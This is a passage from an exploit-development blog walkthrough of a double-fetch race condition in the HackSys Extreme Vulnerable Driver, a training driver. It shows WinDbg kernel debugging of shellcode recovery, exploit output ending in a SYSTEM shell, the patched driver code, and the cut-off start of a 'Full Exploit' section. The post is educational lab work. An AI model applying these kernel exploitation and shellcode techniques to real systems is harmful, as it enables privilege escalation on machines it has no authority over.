<a id="__codelineno-30-6" name="__codelineno-30-6"></a>1: kd&gt; 
<a id="__codelineno-30-7" name="__codelineno-30-7"></a>nt!IofCallDriver+0x59:
<a id="__codelineno-30-8" name="__codelineno-30-8"></a>fffff803`add13799 4883c438        add     rsp,38h
<a id="__codelineno-30-9" name="__codelineno-30-9"></a>1: kd&gt; 
<a id="__codelineno-30-10" name="__codelineno-30-10"></a>nt!IofCallDriver+0x5d:
<a id="__codelineno-30-11" name="__codelineno-30-11"></a>fffff803`add1379d c3              ret
<a id="__codelineno-30-12" name="__codelineno-30-12"></a>1: kd&gt; 
<a id="__codelineno-30-13" name="__codelineno-30-13"></a>nt!IopSynchronousServiceTail+0x1ab:
<a id="__codelineno-30-14" name="__codelineno-30-14"></a>fffff803`ae1b387b 448bf0          mov     r14d,eax
<a id="__codelineno-30-15" name="__codelineno-30-15"></a>
<a id="__codelineno-30-16" name="__codelineno-30-16"></a>[...]
<a id="__codelineno-30-17" name="__codelineno-30-17"></a>
<a id="__codelineno-30-18" name="__codelineno-30-18"></a>1: kd&gt; 
<a id="__codelineno-30-19" name="__codelineno-30-19"></a>nt!IopSynchronousServiceTail+0x2ea:
<a id="__codelineno-30-20" name="__codelineno-30-20"></a>fffff803`ae1b39ba 4c8d4c2438      lea     r9,[rsp+38h]
<a id="__codelineno-30-21" name="__codelineno-30-21"></a>1: kd&gt; 
<a id="__codelineno-30-22" name="__codelineno-30-22"></a>nt!IopSynchronousServiceTail+0x2ef:
<a id="__codelineno-30-23" name="__codelineno-30-23"></a>fffff803`ae1b39bf 4c8d442448      lea     r8,[rsp+48h]
<a id="__codelineno-30-24" name="__codelineno-30-24"></a>1: kd&gt; 
<a id="__codelineno-30-25" name="__codelineno-30-25"></a>nt!IopSynchronousServiceTail+0x2f4:
<a id="__codelineno-30-26" name="__codelineno-30-26"></a>fffff803`ae1b39c4 488d542450      lea     rdx,[rsp+50h]
<a id="__codelineno-30-27" name="__codelineno-30-27"></a>1: kd&gt; 
<a id="__codelineno-30-28" name="__codelineno-30-28"></a>nt!IopSynchronousServiceTail+0x2f9:
<a id="__codelineno-30-29" name="__codelineno-30-29"></a>fffff803`ae1b39c9 e8f2b3b5ff      call    nt!IopCompleteRequest (fffff803`add0edc0)
<a id="__codelineno-30-30" name="__codelineno-30-30"></a>
<a id="__codelineno-30-31" name="__codelineno-30-31"></a>1: kd&gt; 
<a id="__codelineno-30-32" name="__codelineno-30-32"></a>*** Fatal System Error: 0x0000003b
<a id="__codelineno-30-33" name="__codelineno-30-33"></a>                       (0x00000000C0000005,0xFFFFF803ADD0F2A6,0xFFFFF601F0891D60,0x0000000000000000)
<a id="__codelineno-30-34" name="__codelineno-30-34"></a>
<a id="__codelineno-30-35" name="__codelineno-30-35"></a>nt!DbgBreakPointWithStatus:
<a id="__codelineno-30-36" name="__codelineno-30-36"></a>fffff803`addc8810 cc              int     3
</code></pre></div></td></tr></table></div>
<p>Okay, it looks like we couldn't complete our call at <code>nt!IopSynchronousServiceTail+0x2f9</code> which calls into <code>nt!IopCompleteRequest</code> and we can see before that call the registers <code>r9</code>, <code>r8</code> and <code>rdx</code> are used. Let's step into the call to <code>nt!IopCompleteRequest</code> now and see what happens.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-31-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-31-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-31-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-31-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-31-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-31-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-31-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-31-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-31-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-31-10">10</a></span>
<span class="normal"><a href="#__codelineno-31-11">11</a></span>
<span class="normal"><a href="#__codelineno-31-12">12</a></span>
<span class="normal"><a href="#__codelineno-31-13">13</a></span>
<span class="normal"><a href="#__codelineno-31-14">14</a></span>
<span class="normal"><a href="#__codelineno-31-15">15</a></span>
<span class="normal"><a href="#__codelineno-31-16">16</a></span>
<span class="normal"><a href="#__codelineno-31-17">17</a></span>
<span class="normal"><a href="#__codelineno-31-18">18</a></span>
<span class="normal"><a href="#__codelineno-31-19">19</a></span>
<span class="normal"><a href="#__codelineno-31-20">20</a></span>
<span class="normal"><a href="#__codelineno-31-21">21</a></span>
<span class="normal"><a href="#__codelineno-31-22">22</a></span>
<span class="normal"><a href="#__codelineno-31-23">23</a></span>
<span class="normal"><a href="#__codelineno-31-24">24</a></span>
<span class="normal"><a href="#__codelineno-31-25">25</a></span>
<span class="normal"><a href="#__codelineno-31-26">26</a></span>
<span class="normal"><a href="#__codelineno-31-27">27</a></span>
<span class="normal"><a href="#__codelineno-31-28">28</a></span>
<span class="normal"><a href="#__codelineno-31-29">29</a></span>
<span class="normal"><a href="#__codelineno-31-30">30</a></span>
<span class="normal"><a href="#__codelineno-31-31">31</a></span>
<span class="normal"><a href="#__codelineno-31-32">32</a></span>
<span class="normal"><a href="#__codelineno-31-33">33</a></span>
<span class="normal"><a href="#__codelineno-31-34">34</a></span>
<span class="normal"><a href="#__codelineno-31-35">35</a></span>
<span class="normal"><a href="#__codelineno-31-36">36</a></span>
<span class="normal"><a href="#__codelineno-31-37">37</a></span>
<span class="normal"><a href="#__codelineno-31-38">38</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1"></a>1: kd&gt; t
<a id="__codelineno-31-2" name="__codelineno-31-2"></a>nt!IopSynchronousServiceTail+0x2f9:
<a id="__codelineno-31-3" name="__codelineno-31-3"></a>fffff801`4afa49c9 e8f2b3b5ff      call    nt!IopCompleteRequest (fffff801`4aaffdc0)
<a id="__codelineno-31-4" name="__codelineno-31-4"></a>1: kd&gt; t
<a id="__codelineno-31-5" name="__codelineno-31-5"></a>nt!IopCompleteRequest:
<a id="__codelineno-31-6" name="__codelineno-31-6"></a>fffff801`4aaffdc0 4053            push    rbx
<a id="__codelineno-31-7" name="__codelineno-31-7"></a>
<a id="__codelineno-31-8" name="__codelineno-31-8"></a>[...]
<a id="__codelineno-31-9" name="__codelineno-31-9"></a>
<a id="__codelineno-31-10" name="__codelineno-31-10"></a>1: kd&gt; 
<a id="__codelineno-31-11" name="__codelineno-31-11"></a>nt!IopCompleteRequest+0x8e:
<a id="__codelineno-31-12" name="__codelineno-31-12"></a>fffff801`4aaffe4e 4c8b7308        mov     r14,qword ptr [rbx+8]
<a id="__codelineno-31-13" name="__codelineno-31-13"></a>
<a id="__codelineno-31-14" name="__codelineno-31-14"></a>[...]
<a id="__codelineno-31-15" name="__codelineno-31-15"></a>
<a id="__codelineno-31-16" name="__codelineno-31-16"></a>1: kd&gt; 
<a id="__codelineno-31-17" name="__codelineno-31-17"></a>nt!IopCompleteRequest+0x4e6:
<a id="__codelineno-31-18" name="__codelineno-31-18"></a>fffff801`4ab002a6 498b06          mov     rax,qword ptr [r14]
<a id="__codelineno-31-19" name="__codelineno-31-19"></a>1: kd&gt; 
<a id="__codelineno-31-20" name="__codelineno-31-20"></a>
<a id="__codelineno-31-21" name="__codelineno-31-21"></a>*** Fatal System Error: 0x0000003b
<a id="__codelineno-31-22" name="__codelineno-31-22"></a>                       (0x00000000C0000005,0xFFFFF8014AB002A6,0xFFFF9C0FCDC8AD60,0x0000000000000000)
<a id="__codelineno-31-23" name="__codelineno-31-23"></a>
<a id="__codelineno-31-24" name="__codelineno-31-24"></a>nt!DbgBreakPointWithStatus:
<a id="__codelineno-31-25" name="__codelineno-31-25"></a>fffff801`4abb9810 cc              int     3
<a id="__codelineno-31-26" name="__codelineno-31-26"></a>
<a id="__codelineno-31-27" name="__codelineno-31-27"></a>CONTEXT:  ffff9c0fcdc8ad60 -- (.cxr 0xffff9c0fcdc8ad60)
<a id="__codelineno-31-28" name="__codelineno-31-28"></a>rax=00000000abeb090f rbx=fffff8014ae7fbf9 rcx=fffff8014ae7fc71
<a id="__codelineno-31-29" name="__codelineno-31-29"></a>rdx=ffff9c0fcdc8b890 rsi=ffffbd84ca586ef0 rdi=fffff8014ae7fc09
<a id="__codelineno-31-30" name="__codelineno-31-30"></a>rip=fffff8014ab002a6 rsp=ffff9c0fcdc8b750 rbp=ffffbd84c9d20800
<a id="__codelineno-31-31" name="__codelineno-31-31"></a> r8=ffff9c0fcdc8b888  r9=ffff9c0fcdc8b878 r10=0000000000000000
<a id="__codelineno-31-32" name="__codelineno-31-32"></a>r11=ffff9c0fcdc8b790 r12=0000000000000000 r13=ffffbd84ca586ef0
<a id="__codelineno-31-33" name="__codelineno-31-33"></a>r14=a6eb00000003bb92 r15=fffff8014ae55b00
<a id="__codelineno-31-34" name="__codelineno-31-34"></a>iopl=0         nv up ei ng nz na pe nc
<a id="__codelineno-31-35" name="__codelineno-31-35"></a>cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010382
<a id="__codelineno-31-36" name="__codelineno-31-36"></a>
<a id="__codelineno-31-37" name="__codelineno-31-37"></a>nt!IopCompleteRequest+0x4e6:
<a id="__codelineno-31-38" name="__codelineno-31-38"></a>fffff801`4ab002a6 498b06          mov     rax,qword ptr [r14] ds:002b:a6eb0000`0003bb92=????????????????
</code></pre></div></td></tr></table></div>
<p>Okay perfect, our access violation occurs on this <code>rax, qword ptr [r14]</code> instruction and we can see in the above that <code>r14</code> gets its value from <code>rbx + 0x8</code> so chances are that the address in <code>rbx + 0x8</code> has been corrupted, lets add a <code>mov rbx, r14</code> into our <code>KERNEL_RECOVERY</code> routine in our shellcode and see what happens.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-32-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-32-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-32-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-32-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-32-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-32-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-32-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-32-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-32-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-32-10">10</a></span>
<span class="normal"><a href="#__codelineno-32-11">11</a></span>
<span class="normal"><a href="#__codelineno-32-12">12</a></span>
<span class="normal"><a href="#__codelineno-32-13">13</a></span>
<span class="normal"><a href="#__codelineno-32-14">14</a></span>
<span class="normal"><a href="#__codelineno-32-15">15</a></span>
<span class="normal"><a href="#__codelineno-32-16">16</a></span>
<span class="normal"><a href="#__codelineno-32-17">17</a></span>
<span class="normal"><a href="#__codelineno-32-18">18</a></span>
<span class="normal"><a href="#__codelineno-32-19">19</a></span>
<span class="normal"><a href="#__codelineno-32-20">20</a></span>
<span class="normal"><a href="#__codelineno-32-21">21</a></span>
<span class="normal"><a href="#__codelineno-32-22">22</a></span>
<span class="normal"><a href="#__codelineno-32-23">23</a></span>
<span class="normal"><a href="#__codelineno-32-24">24</a></span>
<span class="normal"><a href="#__codelineno-32-25">25</a></span>
<span class="normal"><a href="#__codelineno-32-26">26</a></span>
<span class="normal"><a href="#__codelineno-32-27">27</a></span>
<span class="normal"><a href="#__codelineno-32-28">28</a></span>
<span class="normal"><a href="#__codelineno-32-29">29</a></span>
<span class="normal"><a href="#__codelineno-32-30">30</a></span>
<span class="normal"><a href="#__codelineno-32-31">31</a></span>
<span class="normal"><a href="#__codelineno-32-32">32</a></span>
<span class="normal"><a href="#__codelineno-32-33">33</a></span>
<span class="normal"><a href="#__codelineno-32-34">34</a></span>
<span class="normal"><a href="#__codelineno-32-35">35</a></span>
<span class="normal"><a href="#__codelineno-32-36">36</a></span>
<span class="normal"><a href="#__codelineno-32-37">37</a></span>
<span class="normal"><a href="#__codelineno-32-38">38</a></span>
<span class="normal"><a href="#__codelineno-32-39">39</a></span>
<span class="normal"><a href="#__codelineno-32-40">40</a></span>
<span class="normal"><a href="#__codelineno-32-41">41</a></span>
<span class="normal"><a href="#__codelineno-32-42">42</a></span>
<span class="normal"><a href="#__codelineno-32-43">43</a></span>
<span class="normal"><a href="#__codelineno-32-44">44</a></span>
<span class="normal"><a href="#__codelineno-32-45">45</a></span>
<span class="normal"><a href="#__codelineno-32-46">46</a></span>
<span class="normal"><a href="#__codelineno-32-47">47</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1"></a>[...]
<a id="__codelineno-32-2" name="__codelineno-32-2"></a>
<a id="__codelineno-32-3" name="__codelineno-32-3"></a>1: kd&gt; 
<a id="__codelineno-32-4" name="__codelineno-32-4"></a>0000024a`d604005c 4883c438        add     rsp,38h
<a id="__codelineno-32-5" name="__codelineno-32-5"></a>1: kd&gt; 
<a id="__codelineno-32-6" name="__codelineno-32-6"></a>0000024a`d6040060 4c89f3          mov     rbx,r14
<a id="__codelineno-32-7" name="__codelineno-32-7"></a>1: kd&gt; 
<a id="__codelineno-32-8" name="__codelineno-32-8"></a>0000024a`d6040063 c3              ret
<a id="__codelineno-32-9" name="__codelineno-32-9"></a>
<a id="__codelineno-32-10" name="__codelineno-32-10"></a>1: kd&gt; 
<a id="__codelineno-32-11" name="__codelineno-32-11"></a>nt!IofCallDriver+0x59:
<a id="__codelineno-32-12" name="__codelineno-32-12"></a>fffff803`a5113799 4883c438        add     rsp,38h
<a id="__codelineno-32-13" name="__codelineno-32-13"></a>1: kd&gt; 
<a id="__codelineno-32-14" name="__codelineno-32-14"></a>nt!IofCallDriver+0x5d:
<a id="__codelineno-32-15" name="__codelineno-32-15"></a>fffff803`a511379d c3              ret
<a id="__codelineno-32-16" name="__codelineno-32-16"></a>
<a id="__codelineno-32-17" name="__codelineno-32-17"></a>
<a id="__codelineno-32-18" name="__codelineno-32-18"></a>1: kd&gt; 
<a id="__codelineno-32-19" name="__codelineno-32-19"></a>nt!IopSynchronousServiceTail+0x2f9:
<a id="__codelineno-32-20" name="__codelineno-32-20"></a>fffff803`a55b39c9 e8f2b3b5ff      call    nt!IopCompleteRequest (fffff803`a510edc0)
<a id="__codelineno-32-21" name="__codelineno-32-21"></a>
<a id="__codelineno-32-22" name="__codelineno-32-22"></a>[...]
<a id="__codelineno-32-23" name="__codelineno-32-23"></a>
<a id="__codelineno-32-24" name="__codelineno-32-24"></a>1: kd&gt; 
<a id="__codelineno-32-25" name="__codelineno-32-25"></a>nt!IopCompleteRequest+0x4de:
<a id="__codelineno-32-26" name="__codelineno-32-26"></a>fffff803`a510f29e c3              ret
<a id="__codelineno-32-27" name="__codelineno-32-27"></a>
<a id="__codelineno-32-28" name="__codelineno-32-28"></a>
<a id="__codelineno-32-29" name="__codelineno-32-29"></a>[...]
<a id="__codelineno-32-30" name="__codelineno-32-30"></a>
<a id="__codelineno-32-31" name="__codelineno-32-31"></a>1: kd&gt; 
<a id="__codelineno-32-32" name="__codelineno-32-32"></a>nt!IopSynchronousServiceTail+0x2c6:
<a id="__codelineno-32-33" name="__codelineno-32-33"></a>fffff803`a55b3996 c3              ret
<a id="__codelineno-32-34" name="__codelineno-32-34"></a>
<a id="__codelineno-32-35" name="__codelineno-32-35"></a>[...]
<a id="__codelineno-32-36" name="__codelineno-32-36"></a>
<a id="__codelineno-32-37" name="__codelineno-32-37"></a>1: kd&gt; 
<a id="__codelineno-32-38" name="__codelineno-32-38"></a>nt!NtDeviceIoControlFile+0x5a:
<a id="__codelineno-32-39" name="__codelineno-32-39"></a>fffff803`a55b57da c3              ret
<a id="__codelineno-32-40" name="__codelineno-32-40"></a>
<a id="__codelineno-32-41" name="__codelineno-32-41"></a>[...]
<a id="__codelineno-32-42" name="__codelineno-32-42"></a>
<a id="__codelineno-32-43" name="__codelineno-32-43"></a>1: kd&gt; 
<a id="__codelineno-32-44" name="__codelineno-32-44"></a>nt!KiSystemServiceExit+0x1f0:
<a id="__codelineno-32-45" name="__codelineno-32-45"></a>fffff803`a51d143b 660fefdb        pxor    xmm3,xmm3
<a id="__codelineno-32-46" name="__codelineno-32-46"></a>
<a id="__codelineno-32-47" name="__codelineno-32-47"></a>1: kd&gt; g
</code></pre></div></td></tr></table></div>
<p>And as we can see from the above, the fact we didn't get an access violation suggests that fix has worked, and if we wait a while our exploit finishes and see this....</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SYSTEM shell :)</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-33-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-33-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-33-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-33-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-33-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-33-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-33-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-33-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-33-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-33-10">10</a></span>
<span class="normal"><a href="#__codelineno-33-11">11</a></span>
<span class="normal"><a href="#__codelineno-33-12">12</a></span>
<span class="normal"><a href="#__codelineno-33-13">13</a></span>
<span class="normal"><a href="#__codelineno-33-14">14</a></span>
<span class="normal"><a href="#__codelineno-33-15">15</a></span>
<span class="normal"><a href="#__codelineno-33-16">16</a></span>
<span class="normal"><a href="#__codelineno-33-17">17</a></span>
<span class="normal"><a href="#__codelineno-33-18">18</a></span>
<span class="normal"><a href="#__codelineno-33-19">19</a></span>
<span class="normal"><a href="#__codelineno-33-20">20</a></span>
<span class="normal"><a href="#__codelineno-33-21">21</a></span>
<span class="normal"><a href="#__codelineno-33-22">22</a></span>
<span class="normal"><a href="#__codelineno-33-23">23</a></span>
<span class="normal"><a href="#__codelineno-33-24">24</a></span>
<span class="normal"><a href="#__codelineno-33-25">25</a></span>
<span class="normal"><a href="#__codelineno-33-26">26</a></span>
<span class="normal"><a href="#__codelineno-33-27">27</a></span>
<span class="normal"><a href="#__codelineno-33-28">28</a></span>
<span class="normal"><a href="#__codelineno-33-29">29</a></span>
<span class="normal"><a href="#__codelineno-33-30">30</a></span>
<span class="normal"><a href="#__codelineno-33-31">31</a></span>
<span class="normal"><a href="#__codelineno-33-32">32</a></span>
<span class="normal"><a href="#__codelineno-33-33">33</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1"></a>[+] HEVD: Double Fetch
<a id="__codelineno-33-2" name="__codelineno-33-2"></a>[*] Opening handle to driver!
<a id="__codelineno-33-3" name="__codelineno-33-3"></a>        [+] Opened Driver Handle: 0x94
<a id="__codelineno-33-4" name="__codelineno-33-4"></a>[*] Running exploit function!
<a id="__codelineno-33-5" name="__codelineno-33-5"></a>        [+] Allocated user buffer!
<a id="__codelineno-33-6" name="__codelineno-33-6"></a>[+] Obtaining Driver Base Address!
<a id="__codelineno-33-7" name="__codelineno-33-7"></a>[*] Driver base name is: ntoskrnl.exe
<a id="__codelineno-33-8" name="__codelineno-33-8"></a>[*] ntoskrnl.exe is located at: 0xfffff803a5016000
<a id="__codelineno-33-9" name="__codelineno-33-9"></a>[+] Shellcode allocated at: 0x0000024ad6040000
<a id="__codelineno-33-10" name="__codelineno-33-10"></a>        [+] Opened thread for changing size 160
<a id="__codelineno-33-11" name="__codelineno-33-11"></a>        [+] Set ChangeSizeThread Priority to 15
<a id="__codelineno-33-12" name="__codelineno-33-12"></a>        [+] Opened thread for IOCTL Control 164
<a id="__codelineno-33-13" name="__codelineno-33-13"></a>        [+] Set IoControlThread Priority to 15
<a id="__codelineno-33-14" name="__codelineno-33-14"></a>        [+] Set Affinity Mask for target threads!
<a id="__codelineno-33-15" name="__codelineno-33-15"></a>[+] Sending IOCTL on processor 1
<a id="__codelineno-33-16" name="__codelineno-33-16"></a>        [+] Opened thread for changing size 168
<a id="__codelineno-33-17" name="__codelineno-33-17"></a>        [+] Changing size on processor 0
<a id="__codelineno-33-18" name="__codelineno-33-18"></a>[!] FATAL: Unable to send IOCTL to driver!
<a id="__codelineno-33-19" name="__codelineno-33-19"></a>[!] FATAL: Unable to send IOCTL to driver!
<a id="__codelineno-33-20" name="__codelineno-33-20"></a>[!] FATAL: Unable to send IOCTL to driver!
<a id="__codelineno-33-21" name="__codelineno-33-21"></a>[!] FATAL: Unable to send IOCTL to driver!
<a id="__codelineno-33-22" name="__codelineno-33-22"></a>[!] FATAL: Unable to send IOCTL to driver!
<a id="__codelineno-33-23" name="__codelineno-33-23"></a>        [+] Set ChangeSizeThread Priority to 15
<a id="__codelineno-33-24" name="__codelineno-33-24"></a>        [+] Opened thread for IOCTL Control 172
<a id="__codelineno-33-25" name="__codelineno-33-25"></a>        [+] Set IoControlThread Priority to 15
<a id="__codelineno-33-26" name="__codelineno-33-26"></a>        [+] Set Affinity Mask for target threads!
<a id="__codelineno-33-27" name="__codelineno-33-27"></a>        [+] Changing size on processor 1
<a id="__codelineno-33-28" name="__codelineno-33-28"></a>[+] Sending IOCTL on processor 1
<a id="__codelineno-33-29" name="__codelineno-33-29"></a>Microsoft Windows [Version 10.0.17134.1246]
<a id="__codelineno-33-30" name="__codelineno-33-30"></a>(c) 2018 Microsoft Corporation. All rights reserved.
<a id="__codelineno-33-31" name="__codelineno-33-31"></a>
<a id="__codelineno-33-32" name="__codelineno-33-32"></a>C:\Users\admin\Desktop&gt;whoami
<a id="__codelineno-33-33" name="__codelineno-33-33"></a>nt authority\system
</code></pre></div></td></tr></table></div>
<p>Meaning our shellcode did work and we successfully got kernel continuation! I should note that this section does not put into perspective just how long this part took. Shellcoding is my least favourite part of this job (mostly because I am awful at it) but especially when it comes to process continuation. It is extremely frustrating and time consuming - but stick with it. I learned a ton from this!</p>
<hr>

<h1 id="fix">Fix<a class="headerlink" href="#fix" title="Permanent link">&para;</a></h1>
<p>In the interest of completeness I thought it would be worthwhile documenting the fix for these vulnerabilities. We can open up the patched <abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr> in IDA and take a look at this function again. Below is a <em>cleaned up and simplified</em> output from the patched version of <abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr>.</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Fixed Code</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-34-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-34-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-34-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-34-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-34-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-34-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-34-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-34-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-34-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-34-10">10</a></span>
<span class="normal"><a href="#__codelineno-34-11">11</a></span>
<span class="normal"><a href="#__codelineno-34-12">12</a></span>
<span class="normal"><a href="#__codelineno-34-13">13</a></span>
<span class="normal"><a href="#__codelineno-34-14">14</a></span>
<span class="normal"><a href="#__codelineno-34-15">15</a></span>
<span class="normal"><a href="#__codelineno-34-16">16</a></span>
<span class="normal"><a href="#__codelineno-34-17">17</a></span>
<span class="normal"><a href="#__codelineno-34-18">18</a></span>
<span class="normal"><a href="#__codelineno-34-19">19</a></span>
<span class="normal"><a href="#__codelineno-34-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1"></a><span class="n">TriggerDoubleFetch</span><span class="p">(</span><span class="o">*</span><span class="n">UserDoubleFetch</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-34-2" name="__codelineno-34-2"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-34-3" name="__codelineno-34-3"></a><span class="w">  </span><span class="kt">char</span><span class="w">      </span><span class="n">UserDoubleFetchBuffer</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-34-4" name="__codelineno-34-4"></a><span class="w">  </span><span class="kt">size_t</span><span class="w">    </span><span class="n">UserDoubleFetchSize</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-34-5" name="__codelineno-34-5"></a><span class="w">  </span><span class="kt">char</span><span class="w">      </span><span class="n">KernelBuffer</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span><span class="w"></span>
<a id="__codelineno-34-6" name="__codelineno-34-6"></a>
<a id="__codelineno-34-7" name="__codelineno-34-7"></a><span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">2048</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-34-8" name="__codelineno-34-8"></a><span class="w">  </span><span class="n">ProbeForRead</span><span class="p">(</span><span class="n">UserDoubleFetch</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-34-9" name="__codelineno-34-9"></a>
<a id="__codelineno-34-10" name="__codelineno-34-10"></a><span class="w">  </span><span class="n">UserDoubleFetchBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UserDoubleFetch</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-34-11" name="__codelineno-34-11"></a><span class="w">  </span><span class="n">UserDoubleFetchSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UserDoubleFetch</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-34-12" name="__codelineno-34-12"></a><span class="w">  </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] UserDoubleFetch-&gt;Buffer: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">UserDoubleFetchBuffer</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-34-13" name="__codelineno-34-13"></a><span class="w">  </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] UserDoubleFetch-&gt;Size: 0x%X</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">UserDoubleFetchSize</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-34-14" name="__codelineno-34-14"></a>
<a id="__codelineno-34-15" name="__codelineno-34-15"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">UserDoubleFetchSize</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mh">0x800</span><span class="w"> </span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-34-16" name="__codelineno-34-16"></a><span class="w">  </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-34-17" name="__codelineno-34-17"></a><span class="w">    </span><span class="n">RtlCopyMemory</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">,</span><span class="w"> </span><span class="n">UserDoubleFetchBuffer</span><span class="p">,</span><span class="w"> </span><span class="n">UserDoubleFetchSize</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-34-18" name="__codelineno-34-18"></a><span class="w">  </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-34-19" name="__codelineno-34-19"></a>
<a id="__codelineno-34-20" name="__codelineno-34-20"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>Focusing only on the important parts, we can see very clearly where the fix is. Instead of doing a fetch for the size check and then a fetch again in the call to <code>RtlCopyMemory</code>, the buffer and size values are fetched once before the print statements and those values are used throughout including for the size check and the copy.</p>
<hr>

<h1 id="full-exploit">Full Exploit<a class="headerlink" href="#full-exploit" title="Permanent link">&para;</a></h1>
<p>Thanks for reading, I hope you enjoyed! You can find my full proof of concept below.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-35-1">  1</a></span>
<span class="normal"><a href="#__codelineno-35-2">  2</a></span>
<span class="normal"><a href="#__codelineno-35-3">  3</a></span>
<span class="normal"><a href="#__codelineno-35-4">  4</a></span>
<span class="normal"><a href="#__codelineno-35-5">  5</a></span>
<span class="normal"><a href="#__codelineno-35-6">  6</a></span>
<span class="normal"><a href="#__codelineno-35-7">  7</a></span>
<span class="normal"><a href="#__codelineno-35-8">  8</a></span>
<span class="normal"><a href="#__codelineno-35-9">  9</a></span>
<span class="normal"><a href="#__codelineno-35-10"> 10</a></span>
<span class="normal"><a href="#__codelineno-35-11"> 11</a></span>
<span class="normal"><a href="#__codelineno-35-12"> 12</a></span>
<span class="normal"><a href="#__codelineno-35-13"> 13</a></span>
<span class="normal"><a href="#__codelineno-35-14"> 14</a></span>
<span class="normal"><a href="#__codelineno-35-15"> 15</a></span>
<span class="normal"><a href="#__codelineno-35-16"> 16</a></span>
<span class="normal"><a href="#__codelineno-35-17"> 17</a></span>
<span class="normal"><a href="#__codelineno-35-18"> 18</a></span>
